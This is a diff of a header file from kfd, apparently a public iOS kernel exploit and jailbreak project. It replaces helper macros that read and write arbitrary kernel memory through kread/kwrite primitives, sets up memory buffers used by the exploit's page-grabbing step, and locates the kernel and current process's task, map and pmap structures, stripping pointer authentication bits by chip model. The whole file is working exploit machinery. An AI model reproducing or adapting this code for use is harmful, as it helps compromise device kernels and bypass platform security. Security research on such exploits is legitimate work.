@@ -5,91 +5,185 @@
 #ifndef info_h
 #define info_h
 
-#include "../libkfd.h"
-
-#include "info/dynamic_types/proc.h"
-#include "info/dynamic_types/task.h"
-#include "info/dynamic_types/thread.h"
-#include "info/dynamic_types/vm_map.h"
+#include "info/dynamic_info.h"
+#include "info/static_info.h"
 
 /*
- * Helper macros for dynamic types.
+ * Note that these macros assume that the kfd pointer is in scope.
  */
+#define dynamic_info(field_name)    (kern_versions[kfd->info.env.vid].field_name)
 
-#define dynamic_sizeof(object) (object##_versions[kfd->info.env.vid].object_size)
-
-#define dynamic_offsetof(object, field) (object##_versions[kfd->info.env.vid].field)
-
-#define dynamic_uget(object, field, object_uaddr)                                             \
-    ({                                                                                        \
-        uint64_t field_uaddr = (uint64_t)(object_uaddr) + dynamic_offsetof(object, field);    \
-        object##_##field##_t field_value = *(volatile object##_##field##_t*)(field_uaddr);    \
-        field_value;                                                                          \
+#define dynamic_kget(field_name, object_kaddr)                                    \
+    ({                                                                            \
+        u64 tmp_buffer = 0;                                                       \
+        u64 field_kaddr = (u64)(object_kaddr) + dynamic_info(field_name);         \
+        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));    \
+        tmp_buffer;                                                               \
     })
 
-#define dynamic_uset(object, field, object_uaddr, field_value)                                   \
-    do {                                                                                         \
-        uint64_t field_uaddr = (uint64_t)(object_uaddr) + dynamic_offsetof(object, field);       \
-        *(volatile object##_##field##_t*)(field_uaddr) = (object##_##field##_t)(field_value);    \
+#define dynamic_kset(field_name, new_value, object_kaddr)                          \
+    do {                                                                           \
+        u64 tmp_buffer = new_value;                                                \
+        u64 field_kaddr = (u64)(object_kaddr) + dynamic_info(field_name);          \
+        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));    \
     } while (0)
 
-#define dynamic_kget(object, field, object_kaddr)                                          \
-    ({                                                                                     \
-        uint64_t buffer = 0;                                                               \
-        uint64_t field_kaddr = (uint64_t)(object_kaddr) + dynamic_offsetof(object, field); \
-        kread_kfd((uint64_t)(kfd), (field_kaddr), (&buffer), (sizeof(buffer)));            \
-        object##_##field##_t field_value = *(object##_##field##_t*)(&buffer);              \
-        field_value;                                                                       \
+#define static_kget(object_name, field_name, object_kaddr)                            \
+    ({                                                                                \
+        u64 tmp_buffer = 0;                                                           \
+        u64 field_kaddr = (u64)(object_kaddr) + offsetof(object_name, field_name);    \
+        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));        \
+        tmp_buffer;                                                                   \
     })
 
-#define dynamic_kset_u64(object, field, object_kaddr, field_value)                         \
-    do {                                                                                   \
-        uint64_t buffer = field_value;                                                     \
-        uint64_t field_kaddr = (uint64_t)(object_kaddr) + dynamic_offsetof(object, field); \
-        kwrite_kfd((uint64_t)(kfd), (&buffer), (field_kaddr), (sizeof(buffer)));           \
+#define static_kset(object_name, field_name, new_value, object_kaddr)                 \
+    do {                                                                              \
+        u64 tmp_buffer = new_value;                                                   \
+        u64 field_kaddr = (u64)(object_kaddr) + offsetof(object_name, field_name);    \
+        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));       \
     } while (0)
 
-/*
- * Helper macros for static types.
- */
+static const char info_copy_sentinel[] = "p0up0u was here";
+static const u64 info_copy_sentinel_size = sizeof(info_copy_sentinel);
 
-#define static_sizeof(object) (sizeof(struct object))
+static inline void info_init(struct kfd* kfd)
+{
+    /*
+     * Initialize the kfd->info.copy substructure.
+     *
+     * Note that the vm_copy() call in krkw_helper_grab_free_pages() makes the following assumptions:
+     * - The size of the copy must be strictly greater than msg_ool_size_small.
+     * - The source object must have a copy strategy of MEMORY_OBJECT_COPY_NONE.
+     * - The destination object must have a copy strategy of MEMORY_OBJECT_COPY_SYMMETRIC.
+     */
+    kfd->info.copy.size = pages(4);
+    assert(kfd->info.copy.size > msg_ool_size_small);
+    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.src_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE));
+    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.dst_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE));
+    for (u64 offset = pages(0); offset < kfd->info.copy.size; offset += pages(1)) {
+        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.src_uaddr + offset), info_copy_sentinel_size);
+        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.dst_uaddr + offset), info_copy_sentinel_size);
+    }
 
-#define static_offsetof(object, field) (offsetof(struct object, field))
+    /*
+     * Initialize the kfd->info.env substructure.
+     */
+    kfd->info.env.pid = getpid();
+    print_i32(kfd->info.env.pid);
 
-#define static_uget(object, field, object_uaddr) (((volatile struct object*)(object_uaddr))->field)
+    thread_identifier_info_data_t data = {};
+    thread_info_t info = (thread_info_t)(&data);
+    mach_msg_type_number_t count = THREAD_IDENTIFIER_INFO_COUNT;
+    assert_mach(thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO, info, &count));
+    kfd->info.env.tid = data.thread_id;
+    print_u64(kfd->info.env.tid);
 
-#define static_uset(object, field, object_uaddr, field_value)                  \
-    do {                                                                       \
-        (((volatile struct object*)(object_uaddr))->field = (field_value));    \
-    } while (0)
+    usize size1 = sizeof(kfd->info.env.maxfilesperproc);
+    assert_bsd(sysctlbyname("kern.maxfilesperproc", &kfd->info.env.maxfilesperproc, &size1, NULL, 0));
+    print_u64(kfd->info.env.maxfilesperproc);
 
-#define static_kget(object, field_type, field, object_kaddr)                              \
-    ({                                                                                    \
-        uint64_t buffer = 0;                                                              \
-        uint64_t field_kaddr = (uint64_t)(object_kaddr) + static_offsetof(object, field); \
-        kread_kfd((uint64_t)(kfd), (field_kaddr), (&buffer), (sizeof(buffer)));           \
-        field_type field_value = *(field_type*)(&buffer);                                 \
-        field_value;                                                                      \
-    })
+    struct rlimit rlim = { .rlim_cur = kfd->info.env.maxfilesperproc, .rlim_max = kfd->info.env.maxfilesperproc };
+    assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));
 
-#define static_kset_u64(object, field, object_kaddr, field_value)                         \
-    do {                                                                                  \
-        uint64_t buffer = field_value;                                                    \
-        uint64_t field_kaddr = (uint64_t)(object_kaddr) + static_offsetof(object, field); \
-        kwrite_kfd((uint64_t)(kfd), (&buffer), (field_kaddr), (sizeof(buffer)));          \
-    } while (0)
+    char kern_version[512] = {};
+    usize size2 = sizeof(kern_version);
+    assert_bsd(sysctlbyname("kern.version", &kern_version, &size2, NULL, 0));
+    print_string(kern_version);
+    
+    kfd->info.env.vid = 0;
+    
+    //set offset from static patchfinder
+//    kern_versions[kfd->info.env.vid].kernelcache__cdevsw = off_cdevsw;
+//    kern_versions[kfd->info.env.vid].kernelcache__gPhysBase = off_gPhysBase;
+//    kern_versions[kfd->info.env.vid].kernelcache__gPhysSize = off_gPhysSize;
+//    kern_versions[kfd->info.env.vid].kernelcache__gVirtBase = off_gVirtBase;
+//    kern_versions[kfd->info.env.vid].kernelcache__perfmon_dev_open = off_perfmon_dev_open;
+//    kern_versions[kfd->info.env.vid].kernelcache__perfmon_devices = off_perfmon_devices;
+//    kern_versions[kfd->info.env.vid].kernelcache__ptov_table = off_ptov_table;
+//    kern_versions[kfd->info.env.vid].kernelcache__vn_kqfilter = off_vn_kqfilter;
+//    kern_versions[kfd->info.env.vid].proc__object_size = off_proc_object_size;
+    
+    //T8120(A16), T8103(M1), T8112(M2): t1sz_boot = 17;
+    //others: t1sz_boot = 25;
+    //Source: https://www.reddit.com/r/jailbreak/comments/15b9l7n/comment/jtssz14/?utm_source=share&utm_medium=web2x&context=3
+    if(strstr(get_kernversion(), "T8120") != NULL || strstr(get_kernversion(), "T8103") != NULL || strstr(get_kernversion(), "T8112") != NULL)
+        t1sz_boot = 17;
+    else
+        t1sz_boot = 25;
+    
+    arm64_link_addr = get_vm_kernel_link_addr();
+    
+    print_u64(kfd->info.env.vid);
 
-#define t1sz_boot (25ull)
-#define ptr_mask ((1ull << (64ull - t1sz_boot)) - 1ull)
-#define pac_mask (~ptr_mask)
-#define unsign_kaddr(kaddr) ((kaddr) | (pac_mask))
+//    const u64 number_of_kern_versions = sizeof(kern_versions) / sizeof(kern_versions[0]);
+//    for (u64 i = 0; i < number_of_kern_versions; i++) {
+//        const char* current_kern_version = kern_versions[i].kern_version;
+//        if (!memcmp(kern_version, current_kern_version, strlen(current_kern_version))) {
+//            kfd->info.env.vid = i;
+//            print_u64(kfd->info.env.vid);
+//            return;
+//        }
+//    }
 
-extern const char copy_sentinel[16];
-extern const uint64_t copy_sentinel_size;
+//    assert_false("unsupported osversion");
+}
 
-void info_init(struct kfd* kfd);
-void info_run(struct kfd* kfd);
-void info_free(struct kfd* kfd);
+static inline void info_run(struct kfd* kfd)
+{
+    timer_start();
+
+    /*
+     * current_task()
+     */
+    assert(kfd->info.kaddr.current_proc);
+    kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + dynamic_info(proc__object_size);
+    print_x64(kfd->info.kaddr.current_proc);
+    print_x64(kfd->info.kaddr.current_task);
+
+    /*
+     * current_map()
+     */
+    u64 signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.current_task);
+    kfd->info.kaddr.current_map = UNSIGN_PTR(signed_map_kaddr);
+    print_x64(kfd->info.kaddr.current_map);
+
+    /*
+     * current_pmap()
+     */
+    u64 signed_pmap_kaddr = static_kget(struct _vm_map, pmap, kfd->info.kaddr.current_map);
+    kfd->info.kaddr.current_pmap = UNSIGN_PTR(signed_pmap_kaddr);
+    print_x64(kfd->info.kaddr.current_pmap);
+
+    if (kfd->info.kaddr.kernel_proc) {
+        /*
+         * kernel_task()
+         */
+        kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + dynamic_info(proc__object_size);
+        print_x64(kfd->info.kaddr.kernel_proc);
+        print_x64(kfd->info.kaddr.kernel_task);
+
+        /*
+         * kernel_map()
+         */
+        u64 signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.kernel_task);
+        kfd->info.kaddr.kernel_map = UNSIGN_PTR(signed_map_kaddr);
+        print_x64(kfd->info.kaddr.kernel_map);
+
+        /*
+         * kernel_pmap()
+         */
+        u64 signed_pmap_kaddr = static_kget(struct _vm_map, pmap, kfd->info.kaddr.kernel_map);
+        kfd->info.kaddr.kernel_pmap = UNSIGN_PTR(signed_pmap_kaddr);
+        print_x64(kfd->info.kaddr.kernel_pmap);
+    }
+
+    timer_end();
+}
+
+static inline void info_free(struct kfd* kfd)
+{
+    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size));
+    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.dst_uaddr, kfd->info.copy.size));
+}
 
 #endif /* info_h */
